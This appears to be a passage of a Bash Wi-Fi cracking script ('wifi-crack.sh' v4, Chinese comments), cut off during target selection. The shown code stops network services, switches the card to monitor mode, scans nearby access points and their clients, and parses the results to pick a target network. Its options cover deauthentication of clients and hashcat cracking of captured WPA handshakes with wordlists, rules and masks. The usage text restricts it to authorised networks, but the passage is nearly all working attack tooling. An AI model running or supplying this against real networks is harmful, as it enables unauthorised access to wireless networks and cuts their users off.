set -uo pipefail

# ----------------------------------------------------------------------------
# 0. 颜色 / 日志 / 全局状态
# ----------------------------------------------------------------------------
# [V4-E3] 颜色检测：日志写 stderr，检测 stderr 是否 tty
if [ -t 2 ]; then
  RED=$'\033[0;31m'; GRN=$'\033[0;32m'; YLW=$'\033[1;33m'; CYA=$'\033[0;36m'; DIM=$'\033[2m'; NC=$'\033[0m'
else
  RED=""; GRN=""; YLW=""; CYA=""; DIM=""; NC=""
fi

QUIET=0
DEBUG=0
JSON_OUT=0
KEEP_SVC=0
ARG_IFACE=""
ARG_INDEX=""
DEAUTH_COUNT=0
DEAUTH_TARGET=""
WIPE=0
USER_WORDLIST="${WORDLIST:-}"
RULE_FILE="${RULE_FILE:-}"
COMBINE_LEFT=""
COMBINE_RIGHT=""
MASK=""
WORDLIST_ONLY=0
NO_BUILTIN=0
SORT_BY_RANK=0
TOP_N=0
WORKLOAD="${WORKLOAD:-3}"
RESTORE=0
SESSION_NAME="${SESSION_NAME:-}"
FORCE_CPU="${FORCE_CPU:-0}"
CAPTURE_DUR="${CAPTURE_DUR:-300}"
SCAN_DUR="${SCAN_DUR:-5}"
NO_AUTO_CRACK="${NO_AUTO_CRACK:-0}"
SELFTEST=0
ARG_BSSID=""
ARG_ESSID=""
ARG_CHANNEL=""
SCRIPT_PATH="${BASH_SOURCE[0]}"

# 运行期全局（全部有默认值，cleanup 不会因未绑定而炸）
IFACE=""
BSSID=""
CHAN=""
SSID=""
ORIG_TYPE="managed"
ORIG_NM_STATE="unknown"
ORIG_WPA_STATE="unknown"
STOP_NM=0
STOP_WPA=0
STOP_IWD=0
STOP_CONNMAN=0
CAP_PID=""
DEAUTH_PID=""
HC_LOG=""
HITFILE=""
HC_SESSION="wifi_crack"
REPORT_FILE=""

usage() {
  cat <<'EOF'
用法: sudo bash wifi-crack.sh [选项] [字典路径]

仅限自己拥有或明确书面授权的网络！

选项:
  -q, --quiet              静默模式（仅最终结果，日志仍落盘）
      --debug              显示 DEBUG 日志
      --json               stdout 输出机器可读 JSON 摘要
      --interface IF       指定无线网卡（默认自动检测 managed/monitor）
      --bssid AA:BB:..     抓包指定 BSSID（无 --channel 时先扫描取信道）
      --essid <ssid>       按 SSID 精确匹配选目标（非交互）
      --index N            按扫描列表编号选目标（非交互）
      --channel N          指定信道
      --deauth N           发 N 次 deauth（默认 0；仅限授权网络）
      --deauth-target CC:  deauth 目标客户端 MAC
      --rule FILE          hashcat 规则文件
      --combine L R        组合攻击 -a 1
      --mask MASK          掩码攻击 -a 3
      --wordlist-only      只用传入字典
      --no-builtin         不合并内置 mini 字典
      --sort-by-rank       字典按频次概率排序（先清洗再排序）
      --top N              只取字典前 N 行
      --workload N         hashcat -w（默认 3）
      --restore            断点续跑（需之前有 session 文件）
      --session NAME       hashcat session 名
      --cpu                强制 CPU（-D 1 --force）
      --duration N         抓包秒数（默认 300，必须 >0）
      --scan-duration N    扫描秒数（默认 5，必须 >0）
      --no-auto-crack      只抓包不破解
      --keep-services-stopped  不自动恢复 NM/wpa_supplicant
      --wipe               退出时删除产物（report.md 先打印到 stderr）
      --selftest           自测模式（不碰网卡）
  -h, --help               本帮助

环境变量: WORDLIST, RULE_FILE, CAPTURE_DUR, SCAN_DUR, WORKLOAD,
          DEAUTH_COUNT, NO_AUTO_CRACK, SESSION_NAME, FORCE_CPU

字典优先级: 传入字典 > /opt/wordlists/*.txt > rockyou > SecLists > 内置
清洗: CRLF/空行/非打印/长度 8~63 过滤 + sort -u 去重
--sort-by-rank: 清洗后按频次排序（保留空格密码）
--bssid 无 --channel: 先快速扫描取信道，失败则报错
--restore: 需之前有相同 --session 的 restore 文件
EOF
  exit 0
}

# [V4-E1] 删除死代码 _dbg；日志函数全部写 stderr + 落盘（-q 只抑制终端，不落盘）
LOG_FILE=""
log()  {
  [ -n "$LOG_FILE" ] && echo "$(date '+%F %T') INFO  $*" >> "$LOG_FILE" 2>/dev/null || true
  [ "$QUIET" -eq 0 ] && echo "[INFO] $*" >&2 || true
}
logd() {
  [ "$DEBUG" -eq 1 ] && echo "${DIM}[DEBUG] $*${NC}" >&2 || true
  [ -n "$LOG_FILE" ] && [ "$DEBUG" -eq 1 ] && echo "$(date '+%F %T') DEBUG $*" >> "$LOG_FILE" 2>/dev/null || true
}
logw() {
  echo "${YLW}[WARN] $*${NC}" >&2
  [ -n "$LOG_FILE" ] && echo "$(date '+%F %T') WARN  $*" >> "$LOG_FILE" 2>/dev/null || true
}
loge() {
  echo "${RED}[ERROR] $*${NC}" >&2
  [ -n "$LOG_FILE" ] && echo "$(date '+%F %T') ERROR $*" >> "$LOG_FILE" 2>/dev/null || true
}
die()  { loge "$*"; exit 1; }


# ----------------------------------------------------------------------------
# 0b. 参数解析
# ----------------------------------------------------------------------------
while [ $# -gt 0 ]; do
  case "$1" in
    -q|--quiet)        QUIET=1 ;;
    --debug)           DEBUG=1 ;;
    --json)            JSON_OUT=1 ;;
    --interface)       shift; ARG_IFACE="${1:-}" ;;
    --interface=*)     ARG_IFACE="${1#*=}" ;;
    --bssid)           shift; ARG_BSSID="${1:-}" ;;
    --bssid=*)         ARG_BSSID="${1#*=}" ;;
    --essid)           shift; ARG_ESSID="${1:-}" ;;
    --essid=*)         ARG_ESSID="${1#*=}" ;;
    --index)           shift; ARG_INDEX="${1:-}" ;;
    --index=*)         ARG_INDEX="${1#*=}" ;;
    --channel)         shift; ARG_CHANNEL="${1:-}" ;;
    --channel=*)       ARG_CHANNEL="${1#*=}" ;;
    --deauth)          shift; DEAUTH_COUNT="${1:-0}" ;;
    --deauth=*)        DEAUTH_COUNT="${1#*=}" ;;
    --deauth-target)   shift; DEAUTH_TARGET="${1:-}" ;;
    --deauth-target=*) DEAUTH_TARGET="${1#*=}" ;;
    --rule)            shift; RULE_FILE="${1:-}" ;;
    --rule=*)          RULE_FILE="${1#*=}" ;;
    # [V4-F4] --combine 正确解析两个参数
    --combine)         shift; COMBINE_LEFT="${1:-}"; shift; COMBINE_RIGHT="${1:-}" ;;
    --combine=*)       COMBINE_LEFT="${1#*=}"
                       # 下一个参数是右字典
                       ;;
    --mask)            shift; MASK="${1:-}" ;;
    --mask=*)          MASK="${1#*=}" ;;
    --wordlist-only)   WORDLIST_ONLY=1 ;;
    --no-builtin)      NO_BUILTIN=1 ;;
    --sort-by-rank)    SORT_BY_RANK=1 ;;
    --top)             shift; TOP_N="${1:-0}" ;;
    --top=*)           TOP_N="${1#*=}" ;;
    --workload)        shift; WORKLOAD="${1:-3}" ;;
    --workload=*)      WORKLOAD="${1#*=}" ;;
    --restore)         RESTORE=1 ;;
    --session)         shift; SESSION_NAME="${1:-}" ;;
    --session=*)       SESSION_NAME="${1#*=}" ;;
    --cpu)             FORCE_CPU=1 ;;
    --duration)        shift; CAPTURE_DUR="${1:-300}" ;;
    --duration=*)      CAPTURE_DUR="${1#*=}" ;;
    --scan-duration)   shift; SCAN_DUR="${1:-5}" ;;
    --scan-duration=*) SCAN_DUR="${1#*=}" ;;
    --no-auto-crack)   NO_AUTO_CRACK=1 ;;
    --keep-services-stopped) KEEP_SVC=1 ;;
    --selftest)        SELFTEST=1 ;;
    --wipe)            WIPE=1 ;;
    -h|--help)         usage ;;
    -*)                die "未知选项: $1（--help 看帮助）" ;;
    *)                 USER_WORDLIST="$1" ;;
  esac
  shift || true
done

# [V4-F4] --combine=* 需要额外 shift 取右字典
# （在 while 循环内无法 shift 两次，这里补充处理）
# 注：--combine L R 形式已在 case 内处理；--combine=L R 形式需用户用空格分隔

# [V4-E4] 参数校验加固
[[ "$DEAUTH_COUNT" =~ ^[0-9]+$ ]] || die "--deauth 需要非负整数"
[[ "$WORKLOAD" =~ ^[1-4]$ ]] || die "--workload 需要 1~4"
[[ "$CAPTURE_DUR" =~ ^[1-9][0-9]*$ ]] || die "--duration 需要正整数（>0）"
[[ "$SCAN_DUR" =~ ^[1-9][0-9]*$ ]] || die "--scan-duration 需要正整数（>0）"
[[ "$TOP_N" =~ ^[0-9]+$ ]] || die "--top 需要非负整数"
# [V4-F8] --bssid 格式校验
if [ -n "$ARG_BSSID" ]; then
  [[ "$ARG_BSSID" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] || die "--bssid 格式错误: $ARG_BSSID"
fi
# [V4-H4] --deauth-target MAC 校验
if [ -n "$DEAUTH_TARGET" ]; then
  [[ "$DEAUTH_TARGET" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] || die "--deauth-target MAC 格式错误: $DEAUTH_TARGET"
fi
# [V4-M3] --index 校验
if [ -n "$ARG_INDEX" ]; then
  [[ "$ARG_INDEX" =~ ^[1-9][0-9]*$ ]] || die "--index 需要正整数"
fi

# [H-4] 私有工作目录（mktemp -d 默认 700，路径不可预测）
OUT_DIR=$(mktemp -d /tmp/wifi-lab.XXXXXX) || die "无法创建临时工作目录"
export OUT_DIR
RESTORE_FILE="$OUT_DIR/iface-state"     # [F-7] 不再放 /tmp 根、不再被 source
LOG_FILE="$OUT_DIR/run.log"
REPORT_FILE="$OUT_DIR/report.md"
# [V4-F5] 全局固定锁路径（每次 mktemp 新目录的锁无效）
LOCK_FILE="/run/lock/wifi-crack.lock"
mkdir -p /run/lock 2>/dev/null || LOCK_FILE="${TMPDIR:-/tmp}/wifi-crack.lock"
: > "$REPORT_FILE"
{
  echo "# wifi-crack v4 运行报告"
  echo
  echo "- 开始时间: $(date '+%F %T')"
  echo "- 用户: $(id -un)"
  echo "- 参数: deauth=$DEAUTH_COUNT rule=${RULE_FILE:-无} mask=${MASK:-无} combine=${COMBINE_LEFT:-无}/${COMBINE_RIGHT:-无}"
  echo
  echo "| 阶段 | 结果 | 详情 |"
  echo "|---|---|---|"
} > "$REPORT_FILE"
# [V4-E2] report() 转义 Markdown 表格分隔符
report() {
  local stage="${1//|/\\|}" result="${2//|/\\|}" detail="${3//|/\\|}"
  echo "| $stage | $result | $detail |" >> "$REPORT_FILE" 2>/dev/null || true
}

# [V4-F5] 多实例锁（全局固定路径）
# [V4-E7] 依赖检查 flock
command -v flock >/dev/null 2>&1 || die "缺少 flock（sudo apt install -y util-linux）"
exec 9>"$LOCK_FILE" || die "无法创建锁文件 $LOCK_FILE"
flock -n 9 || die "另一个 wifi-crack 实例正在运行（锁: $LOCK_FILE）"

# ----------------------------------------------------------------------------
# 0c. 清理 / 恢复
# ----------------------------------------------------------------------------
kill_by_bssid() { # [H-3] BSSID 为空时绝不执行 pkill
  local b="${1:-}"
  [ -n "$b" ] || return 0
  pkill -f "airodump-ng.*$b" 2>/dev/null || true
  pkill -f "aireplay-ng.*$b" 2>/dev/null || true
}

cleanup() {
  local exit_code=$?
  [ -n "$CAP_PID" ]   && kill "$CAP_PID" 2>/dev/null || true
  [ -n "$DEAUTH_PID" ] && kill "$DEAUTH_PID" 2>/dev/null || true
  [ -n "${CAP_PID:-}" ] && wait "$CAP_PID" 2>/dev/null || true
  [ -n "${DEAUTH_PID:-}" ] && wait "$DEAUTH_PID" 2>/dev/null || true
  kill_by_bssid "$BSSID"
  restore_iface 2>/dev/null || true
  {
    echo
    echo "- 结束时间: $(date '+%F %T')（退出码 $exit_code）"
    echo "- 产物目录: ${OUT_DIR}（${WIPE:+已随 --wipe 删除}）"
  } >> "$REPORT_FILE" 2>/dev/null || true
  if [ "${WIPE:-1}" -eq 1 ]; then
    # [V4-E8] 先打印报告到 stderr，再删除
    [ -f "$REPORT_FILE" ] && cat "$REPORT_FILE" >&2 2>/dev/null || true
    rm -rf "$OUT_DIR"
  fi
  exit "$exit_code"
}
trap cleanup EXIT
trap 'exit 130' INT
trap 'exit 143' TERM

# [F-7] 网卡状态快照：只写 KEY=VALUE，读取时白名单解析，绝不 source
# [V4-F6][V4-H1] 在 main() 开头调用（precheck 之后、do_scan 之前），
# 确保扫描阶段的 monitor 切换也被记录
snapshot_iface() {
  local cur
  cur=$(iw dev "$IFACE" info 2>/dev/null | awk '/type/{print $2}')
  ORIG_TYPE="${cur:-managed}"
  # [V4-H2][V4-M7] 记录所有网络管理服务状态
  if command -v systemctl >/dev/null 2>&1; then
    ORIG_NM_STATE=$(systemctl is-active NetworkManager 2>/dev/null || echo unknown)
    ORIG_WPA_STATE=$(systemctl is-active wpa_supplicant 2>/dev/null || echo unknown)
    ORIG_IWD_STATE=$(systemctl is-active iwd 2>/dev/null || echo unknown)
    ORIG_CONNMAN_STATE=$(systemctl is-active connman 2>/dev/null || echo unknown)
  fi
  {
    echo "IFACE=$IFACE"
    echo "ORIG_TYPE=$ORIG_TYPE"
    echo "ORIG_NM_STATE=$ORIG_NM_STATE"
    echo "ORIG_WPA_STATE=$ORIG_WPA_STATE"
    echo "ORIG_IWD_STATE=$ORIG_IWD_STATE"
    echo "ORIG_CONNMAN_STATE=$ORIG_CONNMAN_STATE"
    echo "TS=$(date '+%F %T')"
  } > "$RESTORE_FILE" 2>/dev/null || true
  chmod 600 "$RESTORE_FILE" 2>/dev/null || true
  logd "快照: IFACE=$IFACE TYPE=$ORIG_TYPE NM=$ORIG_NM_STATE WPA=$ORIG_WPA_STATE"
}

restore_iface() {
  local target="managed" iface_to_fix=""
  local orig_nm="inactive" orig_wpa="inactive" orig_iwd="inactive" orig_connman="inactive"
  # 白名单读取快照（[F-7] 不 source）
  if [ -f "$RESTORE_FILE" ]; then
    while IFS='=' read -r k v; do
      case "$k" in
        IFACE)              iface_to_fix="$v" ;;
        ORIG_TYPE)          target="$v" ;;
        ORIG_NM_STATE)      orig_nm="$v" ;;
        ORIG_WPA_STATE)     orig_wpa="$v" ;;
        ORIG_IWD_STATE)     orig_iwd="$v" ;;
        ORIG_CONNMAN_STATE) orig_connman="$v" ;;
        TS) : ;;
        *) : ;;
      esac
    done < "$RESTORE_FILE"
  fi
  [ -n "$iface_to_fix" ] || iface_to_fix="${IFACE:-}"
  if [ -n "$iface_to_fix" ] && command -v iw >/dev/null 2>&1; then
    local cur
    cur=$(iw dev "$iface_to_fix" info 2>/dev/null | awk '/type/{print $2}')
    if [ "$cur" != "$target" ]; then
      log "恢复网卡 $iface_to_fix -> $target"
      ip link set "$iface_to_fix" down 2>/dev/null || true
      iw dev "$iface_to_fix" set type "$target" 2>/dev/null || true
      ip link set "$iface_to_fix" up 2>/dev/null || true
    fi
  fi
  # [V4-H2] 恢复之前停止的服务（除非 --keep-services-stopped）
  if [ "$KEEP_SVC" -eq 0 ] && command -v systemctl >/dev/null 2>&1; then
    [ "${STOP_NM:-0}" -eq 1 ] && [ "$orig_nm" = "active" ] && \
      { systemctl start NetworkManager 2>/dev/null || true; log "已恢复 NetworkManager"; }
    [ "${STOP_WPA:-0}" -eq 1 ] && [ "$orig_wpa" = "active" ] && \
      { systemctl start wpa_supplicant 2>/dev/null || true; log "已恢复 wpa_supplicant"; }
    [ -n "${STOP_IWD:-0}" ] && [ "${STOP_IWD:-0}" -eq 1 ] && [ "$orig_iwd" = "active" ] && \
      { systemctl start iwd 2>/dev/null || true; log "已恢复 iwd"; }
    [ -n "${STOP_CONNMAN:-0}" ] && [ "${STOP_CONNMAN:-0}" -eq 1 ] && [ "$orig_connman" = "active" ] && \
      { systemctl start connman 2>/dev/null || true; log "已恢复 connman"; }
  elif [ "$KEEP_SVC" -eq 1 ]; then
    logw "--keep-services-stopped: 不恢复网络管理服务"
  fi
  rm -f "$RESTORE_FILE" 2>/dev/null || true
}

# ----------------------------------------------------------------------------
# 1. 严格依赖检查 [E-4][E-7]
# ----------------------------------------------------------------------------
precheck() {
  [ "$(id -u)" -eq 0 ] || die "请用 sudo 运行"

  [ "$QUIET" -eq 0 ] && {
    echo "${CYA}============================================================${NC}" >&2
    echo "${CYA}   wifi-crack v4 — WPA 扫描/抓包/离线破解（仅限授权网络）${NC}" >&2
    echo "${CYA}============================================================${NC}" >&2
  }

  local missing=()
  for t in airodump-ng aircrack-ng hashcat hcxpcapngtool iw ip; do
    command -v "$t" >/dev/null 2>&1 || missing+=("$t")
  done
  # [V4-E7] 依赖检查补全
  command -v flock >/dev/null 2>&1 || missing+=("flock")
  command -v timeout >/dev/null 2>&1 || missing+=("timeout")
  if [ "$DEAUTH_COUNT" -gt 0 ] && ! command -v aireplay-ng >/dev/null 2>&1; then
    missing+=("aireplay-ng(仅 --deauth 需要)")
  fi
  # zcat 仅在 rockyou.gz 存在时需要
  [ -f /usr/share/wordlists/rockyou.txt.gz ] && ! command -v zcat >/dev/null 2>&1 && \
    logw "rockyou.txt.gz 存在但 zcat 未装，跳过该字典"
  if [ ${#missing[@]} -gt 0 ]; then
    die "缺少依赖: ${missing[*]}
    安装: sudo apt install -y aircrack-ng hashcat hcxtools wireshark-common"
  fi

  # 可选工具（缺失降级，不致命）
  command -v mergecap   >/dev/null 2>&1 || logw "mergecap 未装（sudo apt install wireshark-common）"
  command -v python3    >/dev/null 2>&1 || logw "python3 未装，CSV/ESSID 解析降级为 awk/sed"
  command -v hcxdumptool >/dev/null 2>&1 || logw "hcxdumptool 未装，跳过 PMKID 主动采集"

  # [V4-M1][V4-M2] 接口识别：支持 --interface + 已有 monitor 接口
  if [ -n "$ARG_IFACE" ]; then
    IFACE="$ARG_IFACE"
    ip link show "$IFACE" >/dev/null 2>&1 || die "接口 $IFACE 不存在"
    log "使用指定接口: $IFACE"
  else
    # 先找 managed，再找 monitor
    IFACE=$(iw dev 2>/dev/null | awk '
      /Interface/{ iface=$2 }
      /type managed/{ if (iface) { print iface; exit } }
    ')
    if [ -z "$IFACE" ]; then
      IFACE=$(iw dev 2>/dev/null | awk '
        /Interface/{ iface=$2 }
        /type monitor/{ if (iface) { print iface; exit } }
      ')
      [ -n "$IFACE" ] && logw "使用已有 monitor 接口: $IFACE"
    fi
    if [ -z "$IFACE" ]; then
      IFACE=$(ip -o link 2>/dev/null | awk -F': ' '/^[0-9]+: wlan/ && $2 !~ /@/ {print $2; exit}')
    fi
  fi
  [ -n "$IFACE" ] || die "未找到无线网卡（用 --interface 指定，或检查驱动/BIOS）"

  # [V4-M8] 射频阻断检测
  if command -v rfkill >/dev/null 2>&1; then
    rfkill list wifi 2>/dev/null | grep -q 'Soft blocked: yes' && \
      die "WiFi 被软阻断，先执行: rfkill unblock wifi"
    rfkill list wifi 2>/dev/null | grep -q 'Hard blocked: yes' && \
      die "WiFi 被硬阻断（物理开关），请打开"
  fi

  # monitor 支持性探测
  local cur_type
  cur_type=$(iw dev "$IFACE" info 2>/dev/null | awk '/type/{print $2}')
  if [ "$cur_type" != "monitor" ]; then
    local wiphy
    wiphy=$(iw dev "$IFACE" info 2>/dev/null | awk '/wiphy/{print $2; exit}')
    if [ -n "$wiphy" ]; then
      if ! iw phy "phy$wiphy" info 2>/dev/null | grep -q 'monitor'; then
        die "网卡 $IFACE (phy$wiphy) 不支持 monitor 模式，请换卡"
      fi
    else
      logw "无法确定 $IFACE 的 wiphy，跳过 monitor 能力预检"
    fi
  else
    log "接口 $IFACE 已在 monitor 模式"
  fi

  # hashcat 能力检测
  local hcver
  hcver=$(hashcat -V 2>/dev/null | head -1 || true)
  log "hashcat: ${hcver:-未知版本}"
  if ! hashcat --help 2>&1 | grep -q '22000'; then
    logw "hashcat 可能过旧，不支持 -m 22000。建议升级"
  fi
  # OpenCL / GPU 探测
  local hcdev
  hcdev=$(hashcat -I 2>/dev/null || true)
  if ! printf '%s' "$hcdev" | grep -qi 'opencl\|cuda\|Device'; then
    if [ "$FORCE_CPU" -eq 1 ]; then
      log "无 GPU，已指定 --cpu，使用 -D 1 --force"
    else
      logw "未检测到 OpenCL/CUDA 设备，hashcat 将以 CPU 模式运行"
      FORCE_CPU=1
    fi
  else
    log "OpenCL/CUDA 设备可用"
  fi
}

# ----------------------------------------------------------------------------
# 2. 射频环境准备（[F-4] 扫描/抓包前统一 monitor）
# ----------------------------------------------------------------------------
prepare_radio() {
  local want_monitor="${1:-1}"   # 1=monitor, 0=managed
  local cur
  cur=$(iw dev "$IFACE" info 2>/dev/null | awk '/type/{print $2}')

  if [ "$want_monitor" -eq 1 ]; then
    # [V4-M7] 停止所有干扰服务（NM/wpa_supplicant/iwd/connman）
    if command -v systemctl >/dev/null 2>&1; then
      if systemctl is-active NetworkManager >/dev/null 2>&1; then
        [ "${STOP_NM:-0}" -eq 0 ] && { systemctl stop NetworkManager 2>/dev/null && STOP_NM=1; }
      fi
      if systemctl is-active wpa_supplicant >/dev/null 2>&1; then
        [ "${STOP_WPA:-0}" -eq 0 ] && { systemctl stop wpa_supplicant 2>/dev/null && STOP_WPA=1; }
      fi
      if systemctl is-active iwd >/dev/null 2>&1; then
        [ "${STOP_IWD:-0}" -eq 0 ] && { systemctl stop iwd 2>/dev/null && STOP_IWD=1; }
      fi
      if systemctl is-active connman >/dev/null 2>&1; then
        [ "${STOP_CONNMAN:-0}" -eq 0 ] && { systemctl stop connman 2>/dev/null && STOP_CONNMAN=1; }
      fi
    fi
  fi

  if [ "$want_monitor" -eq 1 ] && [ "$cur" != "monitor" ]; then
    log "接口 $IFACE: ${cur:-?} -> monitor"
    if ! ip link set "$IFACE" down 2>/dev/null; then
      die "无法 down $IFACE（可能被占用）"
    fi
    if ! iw dev "$IFACE" set type monitor 2>/dev/null; then
      ip link set "$IFACE" up 2>/dev/null || true
      die "monitor 模式设置失败（驱动不支持或被占用）"
    fi
    if ! ip link set "$IFACE" up 2>/dev/null; then
      die "monitor 模式下无法 up $IFACE"
    fi
  elif [ "$want_monitor" -eq 0 ]; then
    if [ "$cur" = "monitor" ]; then
      log "接口 $IFACE: monitor -> managed"
      ip link set "$IFACE" down 2>/dev/null || true
      iw dev "$IFACE" set type managed 2>/dev/null || true
      ip link set "$IFACE" up 2>/dev/null || true
    fi
    # [V4-F7][V4-H2] 恢复服务 + 复位 STOP 标志
    if [ "$KEEP_SVC" -eq 0 ] && command -v systemctl >/dev/null 2>&1; then
      [ "${STOP_NM:-0}" -eq 1 ] && { systemctl start NetworkManager 2>/dev/null || true; STOP_NM=0; }
      [ "${STOP_WPA:-0}" -eq 1 ] && { systemctl start wpa_supplicant 2>/dev/null || true; STOP_WPA=0; }
      [ "${STOP_IWD:-0}" -eq 1 ] && { systemctl start iwd 2>/dev/null || true; STOP_IWD=0; }
      [ "${STOP_CONNMAN:-0}" -eq 1 ] && { systemctl start connman 2>/dev/null || true; STOP_CONNMAN=0; }
    fi
  fi
  return 0
}

# ----------------------------------------------------------------------------
# 3. 扫描 [M-1][M-2][M-8]
# ----------------------------------------------------------------------------
do_scan() {
  local dur="$SCAN_DUR"
  local workdir
  workdir=$(mktemp -d "$OUT_DIR/scan.XXXXXX") || die "无法创建扫描目录"

  log "扫描附近 WiFi（${dur}s）..."
  prepare_radio 1

  ( cd "$workdir" && timeout $((dur + 8)) airodump-ng --output-format csv "$IFACE" >/dev/null 2>&1 ) &
  local pid=$!
  sleep $((dur + 5))
  kill "$pid" 2>/dev/null || true
  wait "$pid" 2>/dev/null || true
  pkill -f "airodump-ng.*$IFACE" 2>/dev/null || true

  local csv
  csv=$(ls -1t "$workdir"/airodump-ng-*.csv 2>/dev/null | head -1 || true)
  [ -n "$csv" ] || { prepare_radio 0; rm -rf "$workdir"; die "airodump-ng 未生成 CSV（monitor 可能不工作）"; }

  # [V4-F1][V4-F2][V4-F3] 引号感知解析 + 信号/客户端/加密/PMF 标注
  # airodump-ng CSV 格式:
  #   AP 行 (14+列): BSSID,First,Last,ch,Speed,Privacy,Cipher,Auth,Power,#beacons,#IV,LAN IP,ID-len,ESSID,...
  #   Station 行 (7-8列): Station MAC,First,Last,Power,#packets,BSSID,Probed ESSIDs
  # 输出: BSSID \t CH \t ENC \t POWER \t CLIENTS \t PMF \t SSID
  if command -v python3 >/dev/null 2>&1; then
    python3 - "$csv" <<'PY' > "$OUT_DIR/scan.csv" 2>"$OUT_DIR/scan-parse.err"
import csv, re, sys
bssid_re = re.compile(r'^[0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5}$')
clients = {}
aps = {}
with open(sys.argv[1], newline='', encoding='utf-8', errors='replace') as f:
    for line in f:
        line = line.strip()
        if not line: continue
        try:
            r = next(csv.reader([line]))
        except Exception:
            continue
        mac = r[0].strip() if r else ''
        if not mac or not bssid_re.match(mac): continue
        if len(r) >= 14:
            # AP 行
            if mac not in aps:
                auth  = r[7].strip() if len(r) > 7 else ''
                power = r[8].strip() if len(r) > 8 else ''
                ssid  = r[13].strip() if len(r) > 13 else ''
                # PMF 检测：新 aircrack-ng 在 AP 行有 PMF 标记
                pmf = ''
                for i in range(9, min(len(r), 13)):
                    if 'PMF' in r[i].upper():
                        pmf = 'PMF'
                        break
                # 加密联合解析
                tag = []
                if 'WPA' in auth or 'PSK' in auth: tag.append('WPA')
                if 'WPA2' in auth or '802.11i' in auth: tag.append('2')
                if 'SAE' in auth: tag.append('SAE/WPA3')
                if 'OWE' in auth: tag.append('OWE')
                if 'RADIUS' in auth or 'EAP' in auth or '802.1X' in auth: tag.append('ENTERPRISE')
                if pmf: tag.append(pmf)
                if not tag: tag.append(auth or 'OPEN')
                aps[mac] = dict(ch=r[3].strip(), enc='+'.join(tag),
                                power=power, ssid=ssid)
        elif 7 <= len(r) <= 9:
            # Station 行: r[5] 是关联的 BSSID
            b = r[5].strip() if len(r) > 5 else ''
            if b and bssid_re.match(b):
                clients[b] = clients.get(b, 0) + 1
# [V4-M5] 按信号强度排序（Power 数值越小信号越强）
rows = []
for b, a in aps.items():
    c = clients.get(b, 0)
    s = a['ssid'] if a['ssid'] else '(隐藏)'
    # Power 解析：可能是 "52" 或 "52.5" 或空
    try:
        pwr = float(a['power']) if a['power'] else 999
    except ValueError:
        pwr = 999
    rows.append((pwr, b, a['ch'], a['enc'], a['power'], c, s))
rows.sort(key=lambda x: x[0])  # 信号最强（Power 最小）在前
for _, b, ch, enc, pwr, c, s in rows:
    print(f"{b}\t{ch}\t{enc}\t{pwr}\t{c}\t{s}")
PY
    # [V4 修复#26] Python 解析错误不再静默吞掉
    if [ -s "$OUT_DIR/scan-parse.err" ]; then
      logw "CSV 解析警告: $(head -1 "$OUT_DIR/scan-parse.err")"
    fi
  else
    logw "python3 未装，使用 awk 兜底解析（SSID 含逗号/引号时可能错位）"
    # [V4-F1] awk 兜底也修正列位
    awk -F',' '
      /^[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:[0-9a-fA-F]{2}:/ && NF >= 14 {
        bssid=$1; ch=$4; auth=$8; power=$9; ssid=$14
        gsub(/"/,"",ssid); gsub(/^[ \t]+|[ \t]+$/,"",ssid)
        if (ssid == "") s="(隐藏)"; else s=ssid
        tag=auth
        if (index(auth,"SAE")) tag="SAE/WPA3"
        else if (index(auth,"RADIUS")||index(auth,"802.1X")) tag="ENTERPRISE"
        if (!seen[bssid]++) print bssid"\t"ch"\t"tag"\t"power"\t0\t"s
      }
    ' "$csv" | sort -t$'\t' -k4,4n > "$OUT_DIR/scan.csv"
  fi
  prepare_radio 0
  rm -rf "$workdir"

  local n; n=$(wc -l < "$OUT_DIR/scan.csv")
  [ "$n" -gt 0 ] || die "扫描结果为空，请靠近路由器再试"

  printf "%3s  %-22s  %3s  %-16s  %6s  %4s  %s\n" "编号" "BSSID" "ch" "加密" "信号" "客户端" "SSID"
  echo " ---------------------------------------------------------------------------------"
  local i=1 bssid ch enc pwr cli s
  while IFS=$'\t' read -r bssid ch enc pwr cli s; do
    printf "%3s  %-22s  %3s  %-16s  %6s  %4s  %s\n" "[$i]" "$bssid" "$ch" "$enc" "${pwr:-?}" "${cli:-0}" "$s"
    i=$((i+1))
  done < "$OUT_DIR/scan.csv"
  echo " ---------------------------------------------------------------------------------"
  log "共 $n 个网络（含隐藏 SSID）"
  report "扫描" "OK" "$n 个网络"
}
# ----------------------------------------------------------------------------
# 4. 目标选择（支持非交互 --bssid/--essid）
# ----------------------------------------------------------------------------
pick_target() {
  if [ -n "$ARG_BSSID" ]; then
    # [V4-F8] 格式校验已在参数解析阶段完成，这里只转换大小写
    BSSID=$(echo "$ARG_BSSID" | tr 'a-f' 'A-F')
    SSID="(指定BSSID)"
    # 从扫描结果补信道（若扫描过）
    if [ -f "$OUT_DIR/scan.csv" ]; then
      CHAN=$(awk -F'\t' -v b="$BSSID" '$1==b{print $2; exit}' "$OUT_DIR/scan.csv")
    fi
    CHAN="${CHAN:-${ARG_CHANNEL:-}}"
    # [V4-F9] 无信道时警告
    [ -z "$CHAN" ] && logw "BSSID=$BSSID 未找到信道，将使用信道 1（可能失败）"
    log "已选(指定): BSSID=$BSSID ch=${CHAN:-?} SSID=$SSID"
    return 0
  fi

  # [V4-M3] --index 非交互选目标
  if [ -n "$ARG_INDEX" ]; then
    [ -f "$OUT_DIR/scan.csv" ] || die "--index 需要先扫描"
    local count; count=$(wc -l < "$OUT_DIR/scan.csv")
    [ "$ARG_INDEX" -le "$count" ] || die "--index $ARG_INDEX 超出范围 1..$count"
    IFS=$'\t' read -r BSSID CHAN _ _ _ SSID < <(sed -n "${ARG_INDEX}p" "$OUT_DIR/scan.csv")
  elif [ -z "$ARG_ESSID" ]; then
    [ -f "$OUT_DIR/scan.csv" ] || die "无扫描结果（用 --bssid 或先扫描）"
    local count; count=$(wc -l < "$OUT_DIR/scan.csv")
    echo
    read -rp "请输入要破解的网络编号（1-$count，q 取消）: " CHOICE
    [ -z "$CHOICE" ] && CHOICE="q"
    if [[ "$CHOICE" =~ ^[qQ]$ ]]; then
      log "已取消"; exit 0
    fi
    [[ "$CHOICE" =~ ^[0-9]+$ ]] || die "无效输入: $CHOICE"
    [ "$CHOICE" -le "$count" ] || die "编号 $CHOICE 超出范围 1..$count"
